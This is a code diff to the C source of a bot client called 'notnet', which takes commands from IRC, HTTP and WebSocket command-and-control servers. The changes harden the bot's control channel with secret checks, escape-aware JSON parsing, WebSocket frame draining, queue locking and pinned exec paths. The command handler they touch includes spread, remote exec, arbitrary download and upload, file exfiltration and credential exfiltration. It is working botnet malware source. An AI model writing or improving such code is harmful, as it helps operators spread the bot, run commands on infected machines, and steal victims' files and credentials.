@@ -10,6 +10,7 @@
 #include "plugin.h"
 #include "killswitch.h"
 #include "persist.h"
+#include "mesh.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -408,14 +409,19 @@ static int irc_create_socket(notnet_bot_t *bot) {
 
 int irc_connect(notnet_bot_t *bot) {
     if (bot->c2_irc.connected) return 0;
-    
+
     int sock = irc_create_socket(bot);
     if (sock < 0) return -1;
-    
+
     bot->c2_irc.sock = sock;
     bot->c2_irc.connected = 1;
+    /* #189: the authenticated flag must NOT survive a reconnect — the new
+     * server has not completed any handshake yet. Stale auth let a MITM on
+     * the reconnect accept commands before any 366/376 numeric arrived. */
+    bot->c2_irc.authenticated = 0;
+    bot->c2_irc.joined = 0;
     bot->c2_irc.last_ping = time(NULL);
-    
+
     log_info("IRC: connected to %s:%d", bot->c2_irc.server, bot->c2_irc.port);
     
     /* Send PASS if configured (loaded from config or env) */
@@ -666,37 +672,105 @@ void irc_disconnect(notnet_bot_t *bot) {
 }
 
 /* ── HTTP Implementation ───────────────────────────────────────── */
-/* SECURITY FIX (#35): Verify a C2 response body echoes the shared
- * secret. The bot only trusts command JSON that contains a "secret"
- * field equal to bot->secret — a MITM who can observe the heartbeat
- * can read the secret, but cannot inject commands the bot will trust
- * without also being able to observe the secret echo in real time.
- * Whitespace around the colon is tolerated. Returns 1 if the body
- * carries the secret, 0 otherwise. */
-static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
-    if (!bot || !body || bot->secret[0] == '\0') return 0;
-    const char *key = strstr(body, "\"secret\"");
-    while (key) {
-        const char *p = key + strlen("\"secret\"");
-        while (*p == ' ' || *p == '\t') p++;
-        if (*p == ':') {
+/* #181: one bounded JSON string-field scanner shared by the secret gate
+ * (#35) and both command extractors (#120). Handles backslash escapes so
+ * a value containing \" or \\ can no longer desync the parse. Tracks
+ * object/array nesting so a "secret" hidden inside a nested object does
+ * NOT satisfy the gate — the C2 only ever sends flat command objects, so
+ * a top-level match is the only trustworthy one (#175). Copies the
+ * decoded string value into out (bounded, NUL-terminated); returns 1 on
+ * hit. */
+static int json_find_string(const char *body, const char *key,
+                            char *out, size_t out_sz) {
+    if (!body || !key || !out || out_sz == 0) return 0;
+    char needle[64];
+    if (snprintf(needle, sizeof(needle), "\"%s\"", key) >= (int)sizeof(needle))
+        return 0;
+    int depth = -1;             /* nesting: -1 = before root object; root
+                                 * object's '{' brings it to 0, so TOP-LEVEL
+                                 * keys match at depth 0. A nested object
+                                 * pushes to 1+ and its keys never match. */
+    int in_str = 0;             /* inside a JSON string */
+    const char *p = body;
+    while (*p) {
+        char c = *p;
+        if (in_str) {
+            if (c == '\\' && p[1]) { p += 2; continue; }
+            if (c == '"') in_str = 0;
             p++;
-            while (*p == ' ' || *p == '\t') p++;
-            if (*p == '"') {
-                const char *val = p + 1;
-                const char *end = strchr(val, '"');
-                if (end) {
-                    size_t vlen = (size_t)(end - val);
-                    if (vlen == strlen(bot->secret) &&
-                        strncmp(val, bot->secret, vlen) == 0) {
+            continue;
+        }
+        if (c == '"') {
+            /* needle check MUST run before in_str=1: the key's opening
+             * quote is this same character, and once in_str is set the
+             * key text would be skipped as string content. */
+            if (depth == 0 && strncmp(p, needle, strlen(needle)) == 0) {
+                const char *v = p + strlen(needle);
+                while (*v == ' ' || *v == '\t') v++;
+                if (*v == ':') {
+                    v++;
+                    while (*v == ' ' || *v == '\t') v++;
+                    if (*v == '"') {
+                        v++;
+                        size_t o = 0;
+                        while (*v && *v != '"') {
+                            char ch = *v;
+                            if (ch == '\\' && v[1]) {
+                                v++;
+                                switch (*v) {
+                                    case '"':  ch = '"';  break;
+                                    case '\\': ch = '\\'; break;
+                                    case '/':  ch = '/';  break;
+                                    case 'n':  ch = '\n'; break;
+                                    case 'r':  ch = '\r'; break;
+                                    case 't':  ch = '\t'; break;
+                                    case 'b':  ch = '\b'; break;
+                                    case 'f':  ch = '\f'; break;
+                                    default:   ch = *v;   break;  /* \uXXXX raw */
+                                }
+                            }
+                            if (o + 1 < out_sz) out[o++] = ch;
+                            v++;
+                        }
+                        out[o] = '\0';
                         return 1;
                     }
                 }
+                p += strlen(needle);
+                continue;
             }
+            in_str = 1;
+            p++;
+            continue;
         }
-        key = strstr(p, "\"secret\"");
+        if (c == '{' || c == '[') { depth++; p++; continue; }
+        if (c == '}' || c == ']') { depth--; p++; continue; }
+        p++;
     }
     return 0;
+}
+
+/* SECURITY FIX (#35): Verify a C2 response body echoes the shared secret.
+ * The bot only trusts command JSON that contains a "secret" field equal
+ * to bot->secret — a MITM who can observe the heartbeat can read the
+ * secret, but cannot inject commands the bot will trust without also
+ * being able to observe the secret echo in real time.
+ * #175/#181: now parses via json_find_string (escape-aware) and compares
+ * CONSTANT-TIME (the proxy/relay token checks have been const-time since
+ * #11 — this path was the inconsistent one). Returns 1 on match. */
+static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
+    if (!bot || !body || bot->secret[0] == '\0') return 0;
+    char val[sizeof(bot->secret) + 1];
+    if (!json_find_string(body, "secret", val, sizeof(val))) return 0;
+    size_t vlen = strlen(val);
+    size_t slen = strlen(bot->secret);
+    if (vlen != slen) return 0;
+    /* vlen == slen here, so the loop always covers the full secret */
+    unsigned char diff = 0;
+    for (size_t i = 0; i < slen; i++) {
+        diff |= (unsigned char)val[i] ^ (unsigned char)bot->secret[i];
+    }
+    return diff == 0 ? 1 : 0;
 }
 
 int http_connect(notnet_bot_t *bot) {
@@ -838,15 +912,18 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
     const char *host = bot->c2_http.effective_server[0]
                        ? bot->c2_http.effective_server : bot->c2_http.server;
     char headers[1024];
+    /* #167: command responses now carry the secret header so the C2 can
+     * authenticate them (heartbeats carry it in the body as before). */
     snprintf(headers, sizeof(headers),
         "POST %s HTTP/1.1\r\n"
         "Host: %s\r\n"
         "Content-Type: application/json\r\n"
         "User-Agent: %s\r\n"
+        "X-Notnet-Secret: %s\r\n"
         "Content-Length: %d\r\n"
         "Connection: keep-alive\r\n"
         "\r\n",
-        bot->c2_http.path, host, bot->c2_http.user_agent, len);
+        bot->c2_http.path, host, bot->c2_http.user_agent, bot->secret, len);
     
     /* SECURITY FIX (#28): Check send() return values to detect connection
      * drops. Previously sent headers+body without checking if they were
@@ -899,13 +976,16 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
     }
 
     char req[1024];
+    /* #173: payload/source downloads now require the secret — send it as a
+     * query param (URL-safe charset) so any GET path authenticates. */
     int reqlen = snprintf(req, sizeof(req),
-        "GET %s HTTP/1.1\r\n"
+        "GET %s%ssecret=%s HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Connection: close\r\n"
         "\r\n",
-        path, host, bot->c2_http.user_agent);
+        path, strchr(path, '?') ? "&" : "?", bot->secret,
+        host, bot->c2_http.user_agent);
     int sent = chan_send(&tls, sock, req, reqlen);
     if (sent < 0 || sent != reqlen) {
         log_warn("HTTP: http_get_url send failed: %s", strerror(errno));
@@ -1191,13 +1271,16 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */
 
     char req[1024];
+    /* #173: same secret query param as http_get_url — this is the
+     * payload-download path (http_download). */
     int reqlen = snprintf(req, sizeof(req),
-        "GET %s HTTP/1.1\r\n"
+        "GET %s%ssecret=%s HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Connection: close\r\n"
         "\r\n",
-        path, host, bot->c2_http.user_agent);
+        path, strchr(path, '?') ? "&" : "?", bot->secret,
+        host, bot->c2_http.user_agent);
 
     if (chan_send(&tls, sock, req, reqlen) != reqlen) {
         log_warn("http_download: GET send failed: %s", strerror(errno));
@@ -1389,7 +1472,9 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         }
     }
 
-    /* Build POST request with Content-Length */
+    /* Build POST request with Content-Length.
+     * #164: uploads now carry the secret header — the C2 rejects
+     * unauthenticated uploads. */
     char headers[1024];
     int hdr_len = snprintf(headers, sizeof(headers),
         "POST %s HTTP/1.1\r\n"
@@ -1397,9 +1482,10 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         "Content-Type: application/octet-stream\r\n"
         "Content-Length: %ld\r\n"
         "User-Agent: %s\r\n"
+        "X-Notnet-Secret: %s\r\n"
         "Connection: close\r\n"
         "\r\n",
-        path, host, file_size, bot->c2_http.user_agent);
+        path, host, file_size, bot->c2_http.user_agent, bot->secret);
 
     if (chan_send(&tls, sock, headers, hdr_len) != hdr_len) {
         log_warn("http_upload: headers send failed: %s", strerror(errno));
@@ -1907,15 +1993,33 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
         if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)mask, 4) != 4) return -1;
     }
 
-    /* Read payload */
-    if (plen > len - 1) plen = len - 1;
+    /* Read payload.
+     * #182: if the declared plen exceeds our buffer we MUST consume the
+     * whole frame anyway — the leftover bytes would otherwise be parsed as
+     * the next frame header, letting a MITM smuggle a crafted second
+     * "frame" past the boundary checks. Oversized frames are drained and
+     * reported as no-data. */
+    int truncated = 0;
+    if (plen > len - 1) {
+        truncated = 1;
+    }
     int total = 0;
     while (total < plen) {
-        int n = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, buf + total, plen - total);
+        char sink[512];
+        char *dst = truncated ? sink : (buf + total);
+        int want = plen - total;
+        if (!truncated && want > len - 1 - total) want = len - 1 - total;
+        if (truncated && want > (int)sizeof(sink)) want = (int)sizeof(sink);
+        int n = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, dst, want);
         if (n <= 0) break;
         total += n;
     }
 
+    if (truncated) {
+        log_warn("WS: frame of %d bytes exceeds buffer %d — drained and dropped",
+                 plen, len);
+        return 0;
+    }
     if (total <= 0) return -1;
 
     /* Unmask if needed */
@@ -1992,33 +2096,18 @@ int protocol_connect_all(notnet_bot_t *bot) {
  * "args" out of the frame into a "cmd args" string, bounded. Returns 1 on
  * success, 0 on no/malformed cmd. */
 static int ws_extract_command(const char *frame, char *out, size_t out_sz) {
-    const char *cmd_key = strstr(frame, "\"cmd\"");
-    if (!cmd_key || out_sz < 2) return 0;
-    const char *start = strchr(cmd_key + 6, '"');
-    const char *end = start ? strchr(start + 1, '"') : NULL;
-    if (!start || !end || end <= start) return 0;
-    size_t clen = (size_t)(end - start - 1);
+    /* #181: use the shared escape-aware json_find_string for both fields
+     * so the WS extractor can no longer desync from the secret gate. */
+    char cmd[128];
+    if (!json_find_string(frame, "cmd", cmd, sizeof(cmd)) || out_sz < 2)
+        return 0;
+    size_t clen = strlen(cmd);
     if (clen == 0 || clen >= 128) return 0;
 
-    char cmd[128];
-    memcpy(cmd, start + 1, clen);
-    cmd[clen] = '\0';
-
-    const char *args_key = strstr(frame, "\"args\"");
     char args[256] = {0};
     size_t alen = 0;
-    if (args_key) {
-        const char *colon = strchr(args_key + 6, ':');
-        const char *args_val = colon ? strchr(colon + 1, '"') : NULL;
-        if (args_val) {
-            const char *args_end = strchr(args_val + 1, '"');
-            if (args_end && args_end > args_val) {
-                alen = (size_t)(args_end - args_val - 1);
-                if (alen >= sizeof(args)) alen = sizeof(args) - 1;
-                memcpy(args, args_val + 1, alen);
-                args[alen] = '\0';
-            }
-        }
+    if (json_find_string(frame, "args", args, sizeof(args))) {
+        alen = strlen(args);
     }
 
     int n;
@@ -2036,13 +2125,23 @@ int protocol_process_commands(notnet_bot_t *bot) {
     char irc_buf[1024];
     char http_buf[1024];
     char ws_buf[1024];
-    
+
+    /* #170: the mesh listen thread pushes onto cmd_queue concurrently.
+     * Hold the queue lock for the whole read+process pass so its pushes
+     * and our compaction can't interleave. */
+    mesh_cmd_queue_lock();
+
     
     /* Check IRC - always read when connected, auth may not be set yet */
     if (bot->c2_irc.connected) {
         int result = irc_read(bot, irc_buf, sizeof(irc_buf));
         if (result == 1) {
-            /* New command in buffer - add to queue */
+            /* New command in buffer - add to queue.
+             * #174: nick-prefix trust alone is spoofable on networks
+             * without services; when an irc_pass is configured, require it
+             * to have been accepted too (authenticated implies PASS ok —
+             * a server that got the wrong PASS never sends 366/376, so
+             * authenticated stays 0 and commands are refused). */
             if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
                 snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", irc_buf);
                 bot->cmd_count++;
@@ -2068,55 +2167,33 @@ int protocol_process_commands(notnet_bot_t *bot) {
             if (!http_body_has_secret(bot, body)) {
                 log_warn("HTTP: command rejected — response did not echo shared secret");
             } else {
-            /* Parse JSON command from response body only */
-            char *cmd_key = strstr(body, "\"cmd\"");
-            if (cmd_key) {
-                char cmd[128];
-                snprintf(cmd, sizeof(cmd), "%s", cmd_key + 6);
-                /* Extract value between quotes */
-                char *start = strchr(cmd, '"');
-                char *end = start ? strchr(start + 1, '"') : NULL;
-                if (start && end && end > start) {
-                    int clen = end - start - 1;
-                    if (clen > 0 && clen < 254 && bot->cmd_count < 256) {
-                        memset(bot->cmd_queue[bot->cmd_count], 0, 256);
-                        strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
-                        bot->cmd_queue[bot->cmd_count][clen] = '\0';
-                        /* Extract args value and append to command */
-                        char *args_key = strstr(body, "\"args\"");
-                        if (args_key) {
-                            /* Find colon after "args" (6 chars), then skip to opening quote of value */
-                            char *colon = strchr(args_key + 6, ':');
-                            char *args_val = NULL;
-                            if (colon) {
-                                args_val = strchr(colon + 1, '\"');
-                            }
-                            if (args_val) {
-                                char *args_end = strchr(args_val + 1, '\"');
-                                if (args_end && args_end > args_val) {
-                                    int alen = args_end - args_val - 1;
-                                    if (alen > 0 && clen + 1 + alen < 255) {
-                                        /* BUGFIX: alen bounds the copy. The old
-                                         * code did snprintf(combined, "%s %s",
-                                         * queue, args_val+1) which copied UNBOUNDED
-                                         * from args_val+1 to the end of the buffer,
-                                         * swallowing any trailing JSON fields
-                                         * (e.g. ", "secret": "..."") into the
-                                         * command. Copy exactly alen bytes. */
-                                        char combined[256];
-                                        memcpy(combined, bot->cmd_queue[bot->cmd_count], clen);
-                                        combined[clen] = ' ';
-                                        memcpy(combined + clen + 1, args_val + 1, alen);
-                                        combined[clen + 1 + alen] = '\0';
-                                        snprintf(bot->cmd_queue[bot->cmd_count], 256,
-                                                 "%.255s", combined);
-                                    }
-                                }
-                            }
+            /* Parse JSON command from response body only.
+             * #181: both fields now come through json_find_string —
+             * escape-aware and bounded, so a value containing \" can no
+             * longer desync the extractor from the secret gate (#175). */
+            char http_cmd[128];
+            if (json_find_string(body, "cmd", http_cmd, sizeof(http_cmd))) {
+                int clen = (int)strlen(http_cmd);
+                if (clen > 0 && clen < 254 && bot->cmd_count < 256) {
+                    memset(bot->cmd_queue[bot->cmd_count], 0, 256);
+                    memcpy(bot->cmd_queue[bot->cmd_count], http_cmd, (size_t)clen);
+                    bot->cmd_queue[bot->cmd_count][clen] = '\0';
+                    /* Extract args value and append to command */
+                    char args_val[256];
+                    if (json_find_string(body, "args", args_val, sizeof(args_val))) {
+                        int alen = (int)strlen(args_val);
+                        if (alen > 0 && clen + 1 + alen < 255) {
+                            char combined[256];
+                            memcpy(combined, bot->cmd_queue[bot->cmd_count], (size_t)clen);
+                            combined[clen] = ' ';
+                            memcpy(combined + clen + 1, args_val, (size_t)alen);
+                            combined[clen + 1 + alen] = '\0';
+                            snprintf(bot->cmd_queue[bot->cmd_count], 256,
+                                     "%.255s", combined);
                         }
-                        bot->cmd_count++;
-                        log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                     }
+                    bot->cmd_count++;
+                    log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                 }
             }
             } /* end else (secret verified) */
@@ -2178,7 +2255,14 @@ int protocol_process_commands(notnet_bot_t *bot) {
             continue;
         }
         bot->cmd_this_second++;
-        
+
+        /* #184: kill is a one-way door — once latched, stop executing the
+         * rest of this tick's queue instead of running commands after it. */
+        if (bot->kill_pending) {
+            log_warn("CMD: kill_pending latched — dropping remaining queued commands");
+            break;
+        }
+
         if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
             char *args = cmd + strlen(CMD_SPREAD);
             while (*args == ' ' || *args == '\t') args++;
@@ -2294,10 +2378,22 @@ int protocol_process_commands(notnet_bot_t *bot) {
             char *args = cmd + strlen(CMD_EXEC);
             while (*args == ' ' || *args == '\t') args++;
 
-            /* Allowlist of permitted commands */
-            static const char *allowlist[] = {
-                "uname", "date", "uptime", "whoami", "id", "ls",
-                "ifconfig", "hostname", "netstat", "ps", NULL
+            /* Allowlist of permitted commands — #179: absolute paths only.
+             * execvp() PATH resolution let a planted directory earlier in
+             * PATH shadow the allowlisted binary when the bot runs as
+             * root. Resolving to fixed locations removes the lookup. */
+            static const char *allowlist[][2] = {
+                { "uname",    "/bin/uname" },
+                { "date",     "/bin/date" },
+                { "uptime",   "/usr/bin/uptime" },
+                { "whoami",   "/usr/bin/whoami" },
+                { "id",       "/usr/bin/id" },
+                { "ls",       "/bin/ls" },
+                { "ifconfig", "/sbin/ifconfig" },
+                { "hostname", "/bin/hostname" },
+                { "netstat",  "/bin/netstat" },
+                { "ps",       "/bin/ps" },
+                { NULL, NULL }
             };
             char cmd_name[64];
             char arg1[256];
@@ -2311,24 +2407,35 @@ int protocol_process_commands(notnet_bot_t *bot) {
             }
 
             /* Check allowlist */
-            int allowed = 0;
-            for (int a = 0; allowlist[a]; a++) {
-                if (strcmp(cmd_name, allowlist[a]) == 0) {
-                    allowed = 1;
+            const char *exec_path = NULL;
+            for (int a = 0; allowlist[a][0]; a++) {
+                if (strcmp(cmd_name, allowlist[a][0]) == 0) {
+                    exec_path = allowlist[a][1];
                     break;
                 }
             }
-            if (!allowed) {
+            if (!exec_path) {
                 log_warn("CMD: exec rejected (not in allowlist): %s", cmd_name);
                 protocol_send_response(bot, CMD_EXEC, "exec rejected: command not allowed");
                 continue;
             }
 
-            /* Optional single argument (e.g. "uname -a") */
+            /* Optional single argument (e.g. "uname -a").
+             * #179: more than one extra token is rejected loudly instead of
+             * silently truncating — "exec ls -la /tmp" used to run just
+             * "-la". */
             char *sp = args + strlen(cmd_name);
             while (*sp == ' ' || *sp == '\t') sp++;
             if (*sp) {
                 snprintf(arg1, sizeof(arg1), "%255s", sp);
+                char *extra = strchr(arg1, ' ');
+                if (!extra) extra = strchr(arg1, '\t');
+                if (extra) {
+                    log_warn("CMD: exec rejected (one argument max): %s", args);
+                    protocol_send_response(bot, CMD_EXEC,
+                        "exec rejected: one optional argument only");
+                    continue;
+                }
             }
 
             log_info("CMD: exec: allowlist hit: %s %s", cmd_name, arg1);
@@ -2365,7 +2472,8 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 close(pipefd[1]);
 
                 char *argv[] = { cmd_name, arg1[0] ? arg1 : NULL, NULL };
-                execvp(cmd_name, argv);
+                /* #179: exec the pinned absolute path, no PATH lookup */
+                execvp(exec_path, argv);
                 _exit(127);
             }
 
@@ -2393,8 +2501,11 @@ int protocol_process_commands(notnet_bot_t *bot) {
         } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
             /* SECURITY FIX (#66): Actually fetch the URL and write to the
              * requested path. Syntax: download <url> <path>.
-             * Path is validated against shell metacharacters — the file
-             * is written with fopen(), never passed to a shell. */
+             * #178 (honest framing): the metacharacter check below is NOT
+             * path scoping — it only prevents shell breakage in code that
+             * no longer shells out. The destination is arbitrary by design
+             * (the C2 controls this bot); do not mistake the check for a
+             * containment boundary. */
             char *args = cmd + strlen(CMD_DOWNLOAD);
             while (*args == ' ' || *args == '\t') args++;
 
@@ -2468,7 +2579,8 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 local_path[511] = '\0';
             }
 
-            /* Validate local path */
+            /* #178 (honest framing): metachar check only — NOT path scoping.
+             * The read side is arbitrary by design (C2-controlled bot). */
             const char *bad = strpbrk(local_path, ";|&`$(){}[]<>!");
             if (bad) {
                 log_warn("CMD: upload rejected (dangerous char in path: %s)", local_path);
@@ -2510,14 +2622,22 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     if (chunk > CHUNK) chunk = CHUNK;
 
                     if (offset == 0) {
-                        /* First chunk: send via protocol_send_response */
+                        /* First chunk: send via protocol_send_response.
+                         * #169: bound the memcpy by the REMAINING space,
+                         * not just rlen — the old guard checked only
+                         * rlen < sizeof(resp), one constant away from a
+                         * stack overflow. Clamp chunk to what fits. */
                         char resp[2048];
                         int rlen = snprintf(resp, sizeof(resp),
                             "exfil_creds chunk: %d/%d bytes", chunk, (int)dlen);
                         if (rlen > 0 && rlen < (int)sizeof(resp)) {
-                            memcpy(resp + rlen, data + offset, chunk);
-                            rlen += chunk;
-                            if (rlen < (int)sizeof(resp) - 1) resp[rlen] = '\0';
+                            int space = (int)sizeof(resp) - 1 - rlen;
+                            if (chunk > space) chunk = space;
+                            if (chunk > 0) {
+                                memcpy(resp + rlen, data + offset, (size_t)chunk);
+                                rlen += chunk;
+                            }
+                            resp[rlen] = '\0';
                         }
                         protocol_send_response(bot, CMD_EXFIL_CREDS, resp);
                     } else {
@@ -2576,17 +2696,19 @@ int protocol_process_commands(notnet_bot_t *bot) {
                         if (chunk > CHUNK) chunk = CHUNK;
 
                         if (offset == 0) {
-                            /* First chunk: send via protocol_send_response */
+                            /* First chunk: send via protocol_send_response.
+                             * #169: same remaining-space bound as exfil_creds. */
                             char resp[2048];
                             int rlen = snprintf(resp, sizeof(resp),
                                 "exfil chunk: %d/%d bytes", chunk, fsize);
                             if (rlen > 0 && rlen < (int)sizeof(resp)) {
-                                memcpy(resp + rlen, data + offset, chunk);
-                                rlen += chunk;
-                                /* Null-terminate after the data */
-                                if (rlen < (int)sizeof(resp) - 1) {
-                                    resp[rlen] = '\0';
+                                int space = (int)sizeof(resp) - 1 - rlen;
+                                if (chunk > space) chunk = space;
+                                if (chunk > 0) {
+                                    memcpy(resp + rlen, data + offset, (size_t)chunk);
+                                    rlen += chunk;
                                 }
+                                resp[rlen] = '\0';
                             }
                             protocol_send_response(bot, CMD_EXFIL, resp);
                         } else {
@@ -3284,7 +3406,10 @@ int protocol_process_commands(notnet_bot_t *bot) {
      * (#107): keep deferred (rate-limited) commands — they were compacted
      * to the front by the loop above, so cmd_count = keep (not 0). */
     bot->cmd_count = keep;
-    
+
+    /* #170: release the queue lock taken at function entry. */
+    mesh_cmd_queue_unlock();
+
     return 0;
 }
 
